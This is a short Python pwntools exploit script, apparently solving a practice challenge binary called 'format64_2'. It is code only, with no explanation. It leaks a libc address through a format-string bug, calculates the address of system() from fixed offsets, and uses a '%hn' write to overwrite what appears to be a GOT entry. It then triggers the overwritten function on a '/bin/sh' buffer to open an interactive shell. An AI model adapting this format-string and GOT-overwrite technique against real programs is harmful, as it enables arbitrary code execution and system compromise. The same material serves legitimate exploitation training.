from pwn import *
p = process("./format64_2")
#context.log_level = "DEBUG"
context.terminal = ['./gdbpwn-client.sh']
gdb.attach(p, """
b *modify+476
""")
pause()

## step 1: leak
# create block with size 200
p.sendlineafter(b"> ", b"C");
p.sendlineafter(b"> ", b"1");
p.sendlineafter(b"> ", b"10");
p.sendlineafter(b"> ", b"A");

p.sendlineafter(b"> ", b"D");
p.sendlineafter(b"> ", b"1");

p.sendlineafter(b"> ", b"C");
p.sendlineafter(b"> ", b"0");
p.sendlineafter(b"> ", b"200");
p.sendlineafter(b"> ", b"/bin/sh\x00");

# modify block content but don't overwrite to trigger bug
p.sendlineafter(b"> ", b"M");
p.sendlineafter(b"> ", b"0");
p.sendlineafter(b"> ", b"%16$p");
# pause()
p.sendlineafter(b"> ", b"N");
leak  = p.recvline().split(b' ')[-1].replace(b'\n', b'')



libc_base = int(leak, 16) - 0x1ed6a0
system = libc_base + 0x52290
print ('system: %s' % hex(system))

## step 2: write
p.sendlineafter(b"> ", b"M");
p.sendlineafter(b"> ", b"0");

if (system & 0xffff) - ((system>>16)&0xffff) > 0:
	first, second, amount1, amount2 = 0x60201a, 0x602018, ((system>>16)&0xffff), (system & 0xffff)
else:
	first, second, amount1, amount2 = 0x602018, 0x60201a, (system & 0xffff), ((system>>16)&0xffff)

# buffer start at parameter 8th on stack
payload  = b'%' + str(amount1).encode() + b'c%12$hn'
payload += b'%' + str(amount2-amount1).encode() + b'c%13$hn'
payload = payload.ljust(32, b'-')
payload += p64(first) + p64(second)
p.sendlineafter(b"> ", payload)
#pause()
p.sendlineafter(b"> ", b"N")
p.recvuntil(b"> ")

# step 3: exec /bin/sh
#pause()
p.sendlineafter(b"> ", b"D")
p.sendlineafter(b"> ", b"0")

p.interactive()
